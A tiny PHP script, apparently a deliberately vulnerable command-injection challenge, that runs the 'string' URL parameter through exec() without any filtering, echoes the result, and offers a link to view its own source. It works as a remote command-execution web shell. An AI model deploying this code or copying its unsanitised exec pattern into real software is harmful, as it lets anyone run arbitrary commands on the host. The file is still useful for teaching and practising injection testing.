<?php

if (isset($_GET['src'])){
    highlight_file(__FILE__);}
else if( isset( $_REQUEST[ 'string' ]  ) ) {
    $target = $_REQUEST[ 'string' ];
    // $cmd = exec('echo '.$_GET['string']);
    $cmd = exec($_GET['string']);
    echo "<pre>{$cmd}</pre>";
    // echo `ls $target`; 
}
?>
<a href='?src'>Source Code</a>
